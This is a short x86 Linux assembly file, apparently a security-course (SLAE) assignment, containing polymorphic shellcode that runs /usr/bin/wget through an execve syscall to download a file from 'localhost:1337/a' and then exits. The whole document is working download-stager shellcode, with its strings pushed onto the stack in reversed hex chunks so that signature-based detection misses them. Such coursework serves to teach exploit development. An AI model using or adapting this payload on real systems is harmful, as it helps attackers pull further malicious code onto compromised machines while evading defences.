# Dissection - download file, polymorphic version
# Paw Petersen, SLAE-656
# https://www.pawpetersen.dk/slae-assignment-6c-polymorphic-shellcode-download-file-linux-x86/
 
global _start
section .text
_start:
  xor   eax,eax
  push  eax
  mov   edx,eax
  mov   al,0xb
  
  ;localhost:1337/a
  push  0x612f3733  ; a/73
  push  0x33313a74  ; 31:t
  push  0x736f686c  ; sohl
  push  0x61636f6c  ; acol

  push  esp
  pop   esi
  push  edx

  push  0x74        ; t
  push  0x6567772f  ; egw/
  push  0x6e69622f  ; nib/
  push  0x7273752f  ; rsu/

  mov   ebx,esp
  push  edx
  push  esi
  push  ebx
  push  esp
  pop   ecx
  int   0x80
  add   eax,0x1
  int   0x80
